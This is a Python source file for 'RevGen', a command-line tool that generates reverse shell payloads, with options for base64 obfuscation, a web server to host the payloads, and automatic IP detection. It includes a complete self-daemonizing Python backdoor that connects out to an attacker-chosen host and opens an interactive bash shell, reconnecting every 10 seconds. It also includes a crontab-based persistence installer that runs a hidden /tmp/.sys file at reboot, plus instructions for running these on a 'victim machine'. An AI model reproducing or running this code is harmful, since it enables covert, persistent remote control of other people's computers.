#!/usr/bin/env python3
"""
RevGen - Reverse Shell Genie 🧞‍♂️
A magical CLI tool for generating reverse shell payloads

Author: Karthik M
License: MIT
"""

import argparse
import sys
import time
import signal
import os
from typing import Optional, Dict, List

# Add utils directory to path - handle both relative and absolute paths
script_dir = os.path.dirname(os.path.abspath(__file__))
utils_dir = os.path.join(script_dir, 'utils')
sys.path.insert(0, utils_dir)
sys.path.insert(0, script_dir)

from utils.generator import PayloadGenerator
from utils.banner import (
    print_banner, print_success, print_error, print_warning, print_info,
    format_payload_output, print_usage_tip, print_legal_warning,
    Colors
)
from utils.helpers import (
    validate_ip_address, validate_port, copy_to_clipboard, obfuscate_payload,
    PayloadWebServer, get_local_ip, get_public_ip, check_listener_status,
    suggest_listener_command, create_payload_script
)


class RevGenCLI:
    """Main CLI application class"""
    
    def __init__(self):
        self.generator = None
        self.web_server = None
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle keyboard interrupt"""
        print(f"\n{Colors.YELLOW}🧞‍♂️ Genie says goodbye! Thanks for using RevGen{Colors.RESET}")
        if self.web_server:
            print_info("Stopping web server...")
            self.web_server.stop_server()
        sys.exit(0)
    
    def setup_argument_parser(self) -> argparse.ArgumentParser:
        """Setup command line argument parser"""
        parser = argparse.ArgumentParser(
            description='🧞‍♂️ RevGen - Reverse Shell Genie: Your magical spellbook for terminal takeovers',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  revgen --ip 192.168.1.100 --port 4444 --lang bash
  revgen --ip 10.0.0.5 --port 9001 --all
  revgen --ip 2001:db8::1 --port 8080 --lang python --copy
  revgen --ip 192.168.1.50 --port 4444 --lang php --obfuscate
  revgen --list
  revgen --auto-ip --port 4444 --lang bash --server

Remember: Only use on systems you own or have permission to test! 🔒
            """
        )
        
        # Core options
        parser.add_argument('--ip', '-i', type=str, help='Target IP address (IPv4 or IPv6)')
        parser.add_argument('--port', '-p', type=int, help='Target port number (1-65535)')
        parser.add_argument('--lang', '-l', type=str, help='Shell language (bash, python, php, etc.)')
        
        # Generation modes
        parser.add_argument('--all', '-a', action='store_true', 
                          help='Generate payloads for all available languages')
        parser.add_argument('--list', action='store_true', 
                          help='List all available shell languages')
        
        # Output options
        parser.add_argument('--copy', '-c', action='store_true', 
                          help='Copy payload to clipboard')
        parser.add_argument('--obfuscate', '-o', action='store_true', 
                          help='Base64 encode the payload')
        parser.add_argument('--output', type=str, 
                          help='Save payload to file')
        
        # Advanced features
        parser.add_argument('--server', '-s', action='store_true', 
                          help='Start web server to host payloads')
        parser.add_argument('--server-port', type=int, default=8080, 
                          help='Web server port (default: 8080)')
        parser.add_argument('--auto-ip', action='store_true', 
                          help='Automatically detect public IP address')
        parser.add_argument('--local-ip', action='store_true', 
                          help='Use local IP address')
        parser.add_argument('--backdoor', action='store_true', 
                          help='Generate persistent backdoor (survives terminal closure)')
        parser.add_argument('--persistence', action='store_true', 
                          help='Generate persistence installer (survives reboots)')
        
        # Utility options
        parser.add_argument('--check-listener', action='store_true', 
                          help='Check if listener is running on target')
        parser.add_argument('--suggest-listener', action='store_true', 
                          help='Suggest listener commands for the port')
        parser.add_argument('--banner', type=str, choices=['main', 'skull', 'fire', 'matrix', 'genie', 'random'],
                          help='Show specific banner style')
        parser.add_argument('--no-banner', action='store_true', 
                          help='Disable startup banner')
        parser.add_argument('--no-tips', action='store_true', 
                          help='Disable usage tips')
        parser.add_argument('--quiet', '-q', action='store_true', 
                          help='Quiet mode - minimal output')
        
        # Info and debugging
        parser.add_argument('--version', action='version', version='RevGen v1.0.0 🧞‍♂️')
        parser.add_argument('--debug', action='store_true', 
                          help='Enable debug output')
        
        return parser
    
    def validate_arguments(self, args) -> bool:
        """Validate command line arguments"""
        # If just listing shells, no other validation needed
        if args.list:
            return True
        
        # If showing banner only
        if args.banner and not any([args.ip, args.all, args.lang]):
            return True
        
        # IP address validation
        if args.auto_ip:
            ip = get_public_ip()
            if not ip:
                print_error("Could not detect public IP address")
                return False
            args.ip = ip
            if not args.quiet:
                print_info(f"Auto-detected public IP: {ip}")
        elif args.local_ip:
            args.ip = get_local_ip()
            if not args.quiet:
                print_info(f"Using local IP: {args.ip}")
        
        # Require IP for payload generation
        if not args.ip and (args.lang or args.all):
            print_error("IP address is required for payload generation")
            print_info("Use --ip <address>, --auto-ip, or --local-ip")
            return False
        
        if args.ip:
            valid, ip_type = validate_ip_address(args.ip)
            if not valid:
                print_error(f"Invalid IP address: {args.ip}")
                return False
            if not args.quiet and ip_type == "IPv6":
                print_info("IPv6 address detected - using IPv6 payloads where available")
        
        # Port validation
        if args.port and not validate_port(args.port):
            print_error(f"Invalid port: {args.port}. Must be 1-65535")
            return False
        
        # Require port for payload generation
        if not args.port and (args.lang or args.all):
            print_error("Port number is required for payload generation")
            return False
        
        # Language validation (done later with generator)
        
        return True
    
    def initialize_generator(self) -> bool:
        """Initialize the payload generator"""
        try:
            self.generator = PayloadGenerator()
            return True
        except Exception as e:
            print_error(f"Failed to initialize payload generator: {e}")
            return False
    
    def list_shells(self):
        """List available shell languages"""
        if not self.generator and not self.initialize_generator():
            return
        
        shells = self.generator.get_available_shells()
        
        print("Available shell languages:")
        for shell in shells:
            print(f"  • {shell}")
        print(f"\nTotal: {len(shells)} shells available")
    
    def generate_single_payload(self, ip: str, port: int, shell_type: str, args) -> bool:
        """Generate a single payload"""
        if not self.generator and not self.initialize_generator():
            return False
        
        try:
            payload, info = self.generator.generate_payload(ip, port, shell_type)
            
            # Apply obfuscation if requested
            if args.obfuscate:
                payload = obfuscate_payload(payload)
                if not args.quiet:
                    print_info("Payload obfuscated with base64 encoding")
            
            # Format and display payload
            output = format_payload_output(
                info.get('name', shell_type), 
                payload, 
                info.get('description', '')
            )
            print(output)
            
            # Copy to clipboard if requested
            if args.copy:
                if copy_to_clipboard(payload):
                    print_success("Payload copied to clipboard! 📋")
                else:
                    print_warning("Could not copy to clipboard")
            
            # Save to file if requested
            if args.output:
                try:
                    with open(args.output, 'w') as f:
                        f.write(payload)
                    print_success(f"Payload saved to {args.output}")
                except Exception as e:
                    print_error(f"Could not save to file: {e}")
            
            return True
            
        except Exception as e:
            print_error(f"Failed to generate {shell_type} payload: {e}")
            return False
    
    def generate_all_payloads(self, ip: str, port: int, args) -> bool:
        """Generate all available payloads"""
        if not self.generator and not self.initialize_generator():
            return False
        
        try:
            all_payloads = self.generator.generate_all_payloads(ip, port)
            
            if not args.quiet:
                print(f"\n{Colors.BOLD}{Colors.GREEN}🧞‍♂️ Generated {len(all_payloads)} reverse shell payloads:{Colors.RESET}\n")
            
            # Group successful and failed payloads
            successful = {}
            failed = []
            
            for shell_type, (payload, info) in all_payloads.items():
                if "error" in info:
                    failed.append((shell_type, payload))
                else:
                    if args.obfuscate:
                        try:
                            payload = obfuscate_payload(payload)
                        except Exception:
                            pass  # Skip obfuscation if it fails
                    successful[shell_type] = (payload, info)
            
            # Display successful payloads
            for shell_type, (payload, info) in successful.items():
                output = format_payload_output(
                    info.get('name', shell_type),
                    payload,
                    info.get('description', '')
                )
                print(output)
                print()  # Add spacing
            
            # Show failed payloads if any
            if failed and not args.quiet:
                print_warning(f"Failed to generate {len(failed)} payloads:")
                for shell_type, error in failed:
                    print(f"  • {shell_type}: {error}")
            
            # Copy first successful payload if requested
            if args.copy and successful:
                first_payload = list(successful.values())[0][0]
                if copy_to_clipboard(first_payload):
                    print_success("First payload copied to clipboard! 📋")
            
            # Start web server if requested
            if args.server:
                self.start_web_server(successful, args.server_port, args)
            
            return len(successful) > 0
            
        except Exception as e:
            print_error(f"Failed to generate payloads: {e}")
            return False
    
    def start_web_server(self, payloads: Dict, port: int, args):
        """Start web server to host payloads"""
        try:
            self.web_server = PayloadWebServer("0.0.0.0", port)
            self.web_server.add_payloads(payloads)
            
            if self.web_server.start_server():
                local_ip = get_local_ip()
                server_url = f"http://{local_ip}:{port}"
                
                print_success(f"🌐 Web server started: {server_url}")
                print_info("Payloads are now accessible via web browser")
                print_info("Press Ctrl+C to stop the server")
                
                # Keep server running
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print_info("\nStopping web server...")
                    self.web_server.stop_server()
                    print_success("Web server stopped")
            else:
                print_error(f"Failed to start web server on port {port}")
        except Exception as e:
            print_error(f"Web server error: {e}")
    
    def check_listener(self, ip: str, port: int):
        """Check if listener is running"""
        print_info(f"Checking for listener on {ip}:{port}...")
        
        if check_listener_status(ip, port):
            print_success(f"✅ Listener detected on {ip}:{port}")
        else:
            print_warning(f"❌ No listener detected on {ip}:{port}")
            print_info("Make sure your listener is running before executing the payload")
    
    def suggest_listeners(self, port: int):
        """Suggest listener commands"""
        print_info(f"Suggested listener commands for port {port}:")
        commands = suggest_listener_command(port)
        
        for i, cmd in enumerate(commands, 1):
            print(f"  {i}. {Colors.CYAN}{cmd}{Colors.RESET}")
    
    def generate_backdoor(self, ip: str, port: int, args):
        """Generate persistent backdoor payload"""
        backdoor_code = f'''import socket,subprocess,os,time,threading,sys
class B:
 def __init__(s,i,p):s.i,s.p,s.r=i,p,True
 def d(s):
  try:
   if os.fork()>0:sys.exit(0)
  except:sys.exit(1)
  os.chdir("/");os.setsid();os.umask(0)
  try:
   if os.fork()>0:sys.exit(0)
  except:sys.exit(1)
  for f in range(256):
   try:os.close(f)
   except:pass
  os.open("/dev/null",os.O_RDWR);os.dup2(0,1);os.dup2(0,2)
 def c(s):
  while s.r:
   try:
    sock=socket.socket();sock.connect((s.i,s.p))
    p=subprocess.Popen(["/bin/bash","-i"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    def r():
     while s.r:
      try:
       d=sock.recv(1024)
       if d:p.stdin.write(d);p.stdin.flush()
       else:break
      except:break
    def w():
     while s.r:
      try:
       o=p.stdout.read(1)
       if o:sock.send(o)
       else:break
      except:break
    threading.Thread(target=r,daemon=True).start();threading.Thread(target=w,daemon=True).start();p.wait()
   except:pass
   finally:
    try:sock.close();p.terminate()
    except:pass
   time.sleep(10)
 def run(s):s.d();s.c()
B("{ip}",{port}).run()'''.replace('\n', ';').replace(' ', '')
        
        backdoor_payload = f'python3 -c "{backdoor_code}" &'
        
        output = f"{Colors.BOLD}{Colors.RED}[Persistent Backdoor]{Colors.RESET}\\n{backdoor_payload}"
        output += f"\\n{Colors.DIM}{Colors.CYAN}💀 True background backdoor - survives terminal closure{Colors.RESET}"
        
        print(output)
        
        if args.copy:
            if copy_to_clipboard(backdoor_payload):
                print_success("Backdoor payload copied to clipboard! 💀")
        
        print(f"\\n{Colors.YELLOW}💡 Instructions:{Colors.RESET}")
        print(f"1. Start listener: {Colors.CYAN}nc -lvnp {port}{Colors.RESET}")
        print(f"2. Execute backdoor command on victim machine")
        print(f"3. Close victim terminal - backdoor keeps running!")
        print(f"4. Auto-reconnects every 10 seconds")
    
    def generate_persistence(self, ip: str, port: int, args):
        """Generate persistence installer"""
        persistence_code = f'''import os,subprocess,sys
try:
 c="@reboot python3 -c \\"import socket,subprocess,os,time,threading;exec(open('/tmp/.sys').read())\\" >/dev/null 2>&1\\n*/10 * * * * python3 -c \\"import socket,subprocess,os,time,threading;exec(open('/tmp/.sys').read())\\" >/dev/null 2>&1\\n"
 p=subprocess.Popen(['crontab','-l'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 o,_=p.communicate()
 if c.strip() not in o.decode():
  n=o.decode()+c
  subprocess.Popen(['crontab','-'],stdin=subprocess.PIPE).communicate(n.encode())
except:pass
exec(open(__file__).read() if '__file__' in globals() else "")'''.replace('\n', ';')
        
        persistence_payload = f'python3 -c "{persistence_code}"'
        
        output = f"{Colors.BOLD}{Colors.MAGENTA}[Persistence Installer]{Colors.RESET}\\n{persistence_payload}"
        output += f"\\n{Colors.DIM}{Colors.CYAN}🔥 Installs cron jobs for automatic startup/reconnection{Colors.RESET}"
        
        print(output)
        
        if args.copy:
            if copy_to_clipboard(persistence_payload):
                print_success("Persistence installer copied to clipboard! 🔥")
        
        print(f"\\n{Colors.YELLOW}💡 Instructions:{Colors.RESET}")
        print(f"1. Execute persistence installer FIRST")
        print(f"2. Then run the backdoor payload")
        print(f"3. Backdoor will survive reboots and reconnect automatically")
    
    def run(self, args=None):
        """Main application entry point"""
        parser = self.setup_argument_parser()
        args = parser.parse_args(args)
        
        # Show banner (unless disabled or in quiet mode)
        if not args.no_banner and not args.quiet:
            if args.banner:
                print_banner(args.banner)
            else:
                print_banner("main")
        
        # Handle banner-only mode
        if args.banner and not any([args.ip, args.all, args.lang, args.list]):
            return
        
        # Validate arguments
        if not self.validate_arguments(args):
            sys.exit(1)
        
        # Handle list mode
        if args.list:
            self.list_shells()
            return
        
        # Handle listener checking
        if args.check_listener and args.ip and args.port:
            self.check_listener(args.ip, args.port)
        
        # Handle listener suggestions
        if args.suggest_listener and args.port:
            self.suggest_listeners(args.port)
        
        # Handle backdoor generation
        if args.backdoor and args.ip and args.port:
            self.generate_backdoor(args.ip, args.port, args)
            return
            
        # Handle persistence generation
        if args.persistence and args.ip and args.port:
            self.generate_persistence(args.ip, args.port, args)
            return
        
        # Generate payloads
        if args.all:
            success = self.generate_all_payloads(args.ip, args.port, args)
        elif args.lang:
            success = self.generate_single_payload(args.ip, args.port, args.lang, args)
        else:
            # No specific action requested
            if not any([args.check_listener, args.suggest_listener, args.banner, args.backdoor, args.persistence]):
                parser.print_help()
            return
        
        # Show usage tip (unless disabled)
        if not args.no_tips and not args.quiet and success:
            print_usage_tip()


def main():
    """Entry point for the application"""
    try:
        # If no arguments provided, start interactive mode
        if len(sys.argv) == 1:
            from interactive_revgen import InteractiveRevGen
            interactive_app = InteractiveRevGen()
            interactive_app.run()
        else:
            # Use traditional CLI mode
            app = RevGenCLI()
            app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}🧞‍♂️ Interrupted by user. Goodbye!{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
